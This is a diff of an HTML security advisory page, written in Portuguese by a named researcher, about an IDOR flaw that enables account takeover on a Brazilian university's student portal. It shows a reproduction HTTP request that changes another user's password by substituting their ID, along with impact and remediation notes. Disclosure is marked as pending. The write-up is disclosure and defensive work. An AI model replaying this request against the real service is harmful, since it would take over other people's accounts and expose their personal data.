@@ -3,10 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samuel Pedrosa | Vulnerability Write-up 0xIDOR</title>
+    <title>SECURITY_ADVISORY: IDOR_TO_ATO</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;900&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #000; }
@@ -17,26 +15,12 @@
             background-size: 40px 40px;
         }
         .scanline {
-            width: 100%;
-            height: 2px;
-            background: rgba(255, 255, 255, 0.05);
-            position: fixed;
-            top: 0;
-            z-index: 999;
-            pointer-events: none;
+            width: 100%; height: 2px; background: rgba(255, 255, 255, 0.05);
+            position: fixed; top: 0; z-index: 999; pointer-events: none;
             animation: scan 8s linear infinite;
         }
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        .cyber-border {
-            border: 1px solid #18181b;
-            transition: all 0.3s ease;
-        }
-        .cyber-border:hover {
-            border-color: #3f3f46;
-        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .code-block { background: rgba(9, 9, 11, 0.8); border: 1px solid #18181b; }
     </style>
 </head>
 <body class="bg-black text-white antialiased overflow-x-hidden">
@@ -45,84 +29,87 @@
 
     <section class="relative pt-32 pb-20 px-6 grid-bg border-b border-zinc-900">
         <div class="max-w-6xl mx-auto relative z-10">
-            <div class="mono text-[10px] text-gray-600 tracking-widest uppercase mb-8">
-                [ REPORT_ID: 0xIDOR_ATO_CENSORED ]
+            <div class="mono text-[10px] text-red-500 tracking-[0.5em] uppercase mb-8">
+                [ ADVISORY_ID: CVE-PENDING-2026 ]
             </div>
             
-            <h1 class="text-5xl md:text-7xl font-black tracking-tighter mb-6 uppercase">
-                Account <br> <span class="text-zinc-500">Takeover</span> via IDOR
+            <h1 class="text-5xl md:text-7xl font-black tracking-tighter mb-6 uppercase leading-tight">
+                Broken Access <br> Control <span class="text-zinc-600 font-light">&</span> <span class="text-white">ATO</span>
             </h1>
 
             <div class="flex flex-wrap items-center gap-6">
-                <div class="flex items-center gap-2">
-                    <span class="px-3 py-1 bg-red-950 text-red-500 text-[10px] mono font-bold border border-red-900">CRITICAL_VULN</span>
+                <div class="border border-zinc-800 px-4 py-2 bg-zinc-950">
+                    <p class="mono text-[10px] text-zinc-500 uppercase">CVSS 3.1 Score</p>
+                    <p class="text-red-500 font-bold">9.1 (CRITICAL)</p>
                 </div>
-                <p class="mono text-[10px] text-gray-500 uppercase tracking-widest">
-                    Target: sia.es****o.br // Date: 20/02/2026
-                </p>
+                <div class="mono text-[10px] text-gray-500 uppercase tracking-widest leading-relaxed">
+                    Vector: Network (AV:N) / Complexity: Low (AC:L) <br>
+                    Privileges: None (PR:N) / Scope: Unchanged (S:U)
+                </div>
             </div>
         </div>
     </section>
 
-    <main class="py-20 px-6 max-w-6xl mx-auto space-y-32">
+    <main class="py-24 px-6 max-w-6xl mx-auto space-y-32">
         
         <div class="grid md:grid-cols-12 gap-12">
-            <div class="md:col-span-4">
-                <h2 class="mono text-sm text-gray-500 tracking-widest uppercase">// 01. SUMÁRIO_EXECUTIVO</h2>
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 01. VULNERABILITY_OVERVIEW</h2>
             </div>
             <div class="md:col-span-8">
-                <p class="text-2xl font-light leading-relaxed text-gray-300">
-                    Foi identificado um <span class="text-white font-mono opacity-60">IDOR</span> crítico que permite a alteração de senha de qualquer usuário da instituição <span class="text-white font-semibold">Es*****o</span>. A falha reside na falta de validação entre a identidade do usuário na sessão e os parâmetros fornecidos no corpo da requisição.
+                <p class="text-xl font-light leading-relaxed text-zinc-300">
+                    Foi identificada uma falha de <span class="text-white font-semibold">Insecure Direct Object Reference (IDOR)</span> no serviço de persistência de identidade do portal <span class="text-zinc-500">Es*****o</span>. A aplicação falha ao realizar o <span class="text-white">mapping</span> de autorização entre o identificador do objeto no <span class="italic">request body</span> e a <span class="text-white">Session State</span> do usuário autenticado.
                 </p>
             </div>
         </div>
 
         <div class="grid md:grid-cols-12 gap-12">
-            <div class="md:col-span-4">
-                <h2 class="mono text-sm text-gray-500 tracking-widest uppercase">// 02. VETOR_DE_ATAQUE</h2>
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 02. EXPLOIT_REPRODUCTION</h2>
             </div>
-            <div class="md:col-span-8">
-                <div class="cyber-border bg-zinc-950 p-6 md:p-10 space-y-6">
-                    <p class="mono text-[10px] text-zinc-500 uppercase tracking-[0.3em]">Request_Manipulation_Payload</p>
+            <div class="md:col-span-8 space-y-8">
+                <div class="code-block p-6 md:p-8">
+                    <p class="mono text-[10px] text-zinc-600 mb-6 uppercase tracking-widest">Insecure_Request_Intercepted</p>
                     <div class="overflow-x-auto">
                         <pre class="mono text-xs md:text-sm text-zinc-400 leading-relaxed">
+<span class="text-zinc-600"># Intercept via Burp Suite Proxy</span>
 POST /sianet/EmailEstudante/AtualizarSenha HTTP/1.1
 Host: sia.es****o.br
-Content-Type: application/json
+Authorization: Bearer [REDACTED_JWT]
+Content-Type: application/json; charset=UTF-8
 
 {
-  "E***cioId": "2024081*****", 
+  <span class="text-white font-bold">"E***cioId": "2024081*****",</span> <span class="text-zinc-600">// Target Object ID (Victim)</span>
   "DisplayName": "SA**** DE SO*** PE****",
-  "Senha": "HackedPassword100!",
-  "ConfirmaSenha": "HackedPassword100!"
+  "Senha": "testpasswrd123",
+  "ConfirmaSenha": "testpasswrd123"
 }</pre>
                     </div>
-                    <div class="pt-6 border-t border-zinc-900">
-                        <p class="text-sm text-zinc-500 italic leading-relaxed">
-                            Ao modificar o <span class="text-zinc-300 font-bold">E***cioId</span> para o identificador de uma vítima alvo, o servidor processa a troca de senha sem validar a autenticidade do requerente, retornando <span class="text-green-500">200 OK</span>.
-                        </p>
-                    </div>
+                </div>
+                <div class="bg-zinc-950 p-6 border-l-2 border-red-900">
+                    <h4 class="mono text-[10px] text-red-500 font-bold uppercase mb-2">Technical Insight:</h4>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        A <span class="text-zinc-200">Business Logic</span> da API assume que o <span class="mono italic">EstacioId</span> fornecido via JSON é o proprietário legítimo da sessão. Ao realizar o <span class="text-zinc-200">Server-Side Update</span>, o backend utiliza esse identificador como chave primária na cláusula <span class="mono">WHERE</span> do banco de dados, permitindo a sobrescrita de credenciais de qualquer <span class="italic">entity</span> no sistema.
+                    </p>
                 </div>
             </div>
         </div>
 
         <div class="grid md:grid-cols-12 gap-12">
-            <div class="md:col-span-4">
-                <h2 class="mono text-sm text-gray-500 tracking-widest uppercase">// 03. ANÁLISE_DE_RISCO</h2>
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 03. DEVSECOPS_REMEDIATION</h2>
             </div>
-            <div class="md:col-span-8 grid md:grid-cols-2 gap-8">
-                <div class="p-8 bg-zinc-950 border border-zinc-900">
-                    <p class="mono text-[10px] text-red-600 mb-4 tracking-widest uppercase">Impacto Operacional</p>
-                    <ul class="text-sm text-zinc-400 space-y-2">
-                        <li>- Comprometimento Total de Contas (ATO)</li>
-                        <li>- Acesso não autorizado a dados da LGPD</li>
-                        <li>- Manipulação de registros acadêmicos</li>
-                    </ul>
-                </div>
-                <div class="p-8 bg-zinc-950 border border-zinc-900">
-                    <p class="mono text-[10px] text-blue-500 mb-4 tracking-widest uppercase">Mitigação Recomendada</p>
+            <div class="md:col-span-8 grid md:grid-cols-2 gap-px bg-zinc-900 border border-zinc-900">
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-zinc-500 uppercase mb-4">Ação Reativa</h5>
                     <p class="text-sm text-zinc-400 leading-relaxed">
-                        Validar o ID do usuário no backend comparando o token JWT/Sessão com o parâmetro recebido. Nunca confiar em identificadores passados no Client-Side.
+                        Implementar <span class="text-zinc-200">Object-Level Authorization</span>. O sistema deve validar se o <span class="mono">UID</span> contido na <span class="mono">claims</span> do JWT corresponde ao <span class="mono text-white">EstacioId</span> requisitado.
+                    </p>
+                </div>
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-zinc-500 uppercase mb-4">Defesa em Camadas</h5>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        Integrar testes de <span class="text-zinc-200">DAST</span> no pipeline de CI/CD para identificar falhas de mapeamento de parâmetros em tempo de execução.
                     </p>
                 </div>
             </div>
@@ -130,17 +117,19 @@ Content-Type: application/json
 
     </main>
 
-    <footer class="bg-white text-black py-20 px-6">
-        <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center gap-12">
-            <div>
-                <h2 class="text-4xl font-black uppercase mb-4">OPERAÇÃO_CONCLUÍDA</h2>
-                <a href="index.html" class="mono text-xs border-b-2 border-black pb-1 hover:text-zinc-500 hover:border-zinc-500 transition-all uppercase tracking-widest">
-                    Voltar ao Terminal Principal
+    <footer class="bg-white text-black py-24 px-6">
+        <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-start md:items-end gap-12">
+            <div class="space-y-6">
+                <div class="h-1 w-20 bg-black"></div>
+                <h2 class="text-5xl font-black uppercase leading-none">END_OF_<br>ADVISORY</h2>
+                <a href="../index.html" class="inline-block mono text-[10px] font-bold tracking-[0.4em] border-2 border-black px-8 py-3 hover:bg-black hover:text-white transition-all">
+                    RETURN_TO_TERMINAL
                 </a>
             </div>
-            <div class="text-right">
-                <p class="text-xl font-bold uppercase">Samuel Pedrosa</p>
-                <p class="mono text-[10px] uppercase tracking-widest text-zinc-500">DevSecOps Engineer / Security Researcher</p>
+            <div class="text-right mono text-[10px] uppercase space-y-1 text-zinc-500">
+                <p>Researcher: Samuel Pedrosa</p>
+                <p>Status: Disclosure_Pending</p>
+                <p>© 2026 // Encrypted_Identity</p>
             </div>
         </div>
     </footer>
